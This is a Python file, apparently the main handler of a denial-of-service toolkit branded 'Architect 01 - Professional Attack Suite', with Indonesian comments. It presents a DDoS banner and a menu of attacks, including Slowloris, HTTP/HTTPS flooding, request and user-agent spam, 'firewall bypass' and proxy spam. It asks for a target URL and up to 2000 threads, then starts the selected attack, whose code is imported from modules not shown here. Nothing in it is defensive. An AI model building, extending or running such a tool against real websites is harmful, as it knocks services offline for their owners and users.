#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Main Handler for Attack Selection
Architect 01 - Professional Suite
FIX: Input URL setiap kali milih attack
"""

import os
import sys
import time
from colorama import Fore, Style, init

# Import attack modules
from core.slowloris import SlowlorisAttack
from core.http_flood import HTTPFlood
from core.request_spam import RequestSpammer
from core.anti_web import AntiWebAttack
from core.useragent_spam import UserAgentSpam
from core.firewall_bypass import FirewallBypass
from core.proxy_spam import ProxySpam
from core.check_ip import check_real_ip
from core.utils.validator import get_target_url

# Initialize colorama
init(autoreset=True)

class AttackHandler:
    """Handle attack selection and execution"""
    
    def __init__(self):
        self.version = "2.0"
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        """Print main banner - DDOS BESAR"""
        banner = f"""
{Fore.RED}
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{Style.RESET_ALL}
{Fore.CYAN}═══════════════════════════════════════════{Style.RESET_ALL}
{Fore.GREEN}ARCHITECT 01 - PROFESSIONAL ATTACK SUITE v{self.version}{Style.RESET_ALL}
{Fore.YELLOW}═══════════════════════════════════════════{Style.RESET_ALL}
        """
        print(banner)
    
    def print_menu(self):
        """Print attack menu - rapi 2 kolom"""
        menu = f"""
{Fore.CYAN}[ ATTACK METHODS ]{Style.RESET_ALL}

{Fore.WHITE}[1]{Fore.YELLOW} Slowloris Attack        {Fore.WHITE}[2]{Fore.YELLOW} Attack Via Link
{Fore.WHITE}[3]{Fore.YELLOW} Spam Request            {Fore.WHITE}[4]{Fore.YELLOW} Flood HTTP/HTTPS
{Fore.WHITE}[5]{Fore.YELLOW} Check Real IP           {Fore.WHITE}[6]{Fore.YELLOW} Anti-Web Attack
{Fore.WHITE}[7]{Fore.YELLOW} Spam Fake UserAgent     {Fore.WHITE}[8]{Fore.YELLOW} Spam Firewall
{Fore.WHITE}[9]{Fore.YELLOW} Spam Proxy              {Fore.WHITE}[0]{Fore.RED} Exit

{Fore.YELLOW}───────────────────────────────────────────{Style.RESET_ALL}
        """
        print(menu)
    
    def get_choice(self):
        """Get user choice with styled prompt"""
        try:
            print(f"{Fore.CYAN}╭─❯ Select attack method [0-9]{Style.RESET_ALL}")
            choice = input(f"{Fore.CYAN}╰─❯ {Style.RESET_ALL}").strip()
            return choice
        except KeyboardInterrupt:
            return '0'
        except:
            return ''
    
    def get_thread_count(self, default=500):
        """Get thread count from user"""
        try:
            print(f"{Fore.CYAN}╭─❯ Enter number of threads (default: {default}){Style.RESET_ALL}")
            thread_input = input(f"{Fore.CYAN}╰─❯ {Style.RESET_ALL}").strip()
            
            if thread_input:
                threads = int(thread_input)
                return max(10, min(threads, 2000))
            else:
                return default
                
        except ValueError:
            print(f"{Fore.RED}╰─❯ Invalid number, using default {default}{Style.RESET_ALL}")
            return default
        except KeyboardInterrupt:
            return default
    
    def run_attack(self, attack_type):
        """Run selected attack - INPUT URL BARU SETIAP KALI"""
        
        # Attack type 5 gak perlu URL
        if attack_type == '5':
            check_real_ip()
            return
        
        # Selain type 5, minta URL BARU
        print(f"{Fore.CYAN}\n╭─❯ Target URL required for this attack{Style.RESET_ALL}")
        target_url = get_target_url()
        
        # Get thread count
        thread_defaults = {
            '1': 300,   # Slowloris
            '2': 200,   # Attack Via Link
            '3': 800,   # Spam Request
            '4': 500,   # Flood HTTP/HTTPS
            '6': 200,   # Anti-Web
            '7': 300,   # UserAgent Spam
            '8': 150,   # Firewall Bypass
            '9': 200,   # Proxy Spam
        }
        
        default = thread_defaults.get(attack_type, 500)
        threads = self.get_thread_count(default)
        
        # Execute attack based on type
        if attack_type == '1':
            print(f"{Fore.GREEN}╰─❯ Starting Slowloris Attack...{Style.RESET_ALL}")
            attack = SlowlorisAttack(target_url, threads)
            attack.start()
            
        elif attack_type == '2':
            print(f"{Fore.GREEN}╰─❯ Attack Via Link selected - using HTTP Flood{Style.RESET_ALL}")
            attack = HTTPFlood(target_url, threads, use_proxy=False)
            attack.start()
            
        elif attack_type == '3':
            print(f"{Fore.GREEN}╰─❯ Starting Request Spam...{Style.RESET_ALL}")
            attack = RequestSpammer(target_url, threads)
            attack.start()
            
        elif attack_type == '4':
            use_proxy = input(f"{Fore.CYAN}╰─❯ Use proxy? (y/n): {Style.RESET_ALL}").lower() == 'y'
            print(f"{Fore.GREEN}╰─❯ Starting HTTP/HTTPS Flood...{Style.RESET_ALL}")
            attack = HTTPFlood(target_url, threads, use_proxy)
            attack.start()
            
        elif attack_type == '6':
            print(f"{Fore.GREEN}╰─❯ Starting Anti-Web Attack...{Style.RESET_ALL}")
            attack = AntiWebAttack(target_url, threads)
            attack.start()
            
        elif attack_type == '7':
            print(f"{Fore.GREEN}╰─❯ Starting UserAgent Spam...{Style.RESET_ALL}")
            attack = UserAgentSpam(target_url, threads)
            attack.start()
            
        elif attack_type == '8':
            print(f"{Fore.GREEN}╰─❯ Starting Firewall Bypass...{Style.RESET_ALL}")
            attack = FirewallBypass(target_url, threads)
            attack.start()
            
        elif attack_type == '9':
            print(f"{Fore.GREEN}╰─❯ Starting Proxy Spam...{Style.RESET_ALL}")
            attack = ProxySpam(target_url, threads)
            attack.start()
    
    def main_loop(self):
        """Main program loop"""
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = self.get_choice()
            
            if choice == '0':
                print(f"{Fore.RED}\n╰─❯ Exiting... Goodbye!{Style.RESET_ALL}")
                sys.exit(0)
            
            elif choice in ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
                try:
                    self.run_attack(choice)
                    print(f"{Fore.YELLOW}\n╰─❯ Attack finished. Press Enter to continue...{Style.RESET_ALL}")
                    input()
                except KeyboardInterrupt:
                    print(f"{Fore.RED}\n╰─❯ Attack interrupted by user{Style.RESET_ALL}")
                    time.sleep(1)
                except Exception as e:
                    print(f"{Fore.RED}\n╰─❯ Error: {str(e)}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}╰─❯ Press Enter to continue...{Style.RESET_ALL}")
                    input()
            else:
                print(f"{Fore.RED}╰─❯ Invalid choice! Press Enter to continue...{Style.RESET_ALL}")
                input()
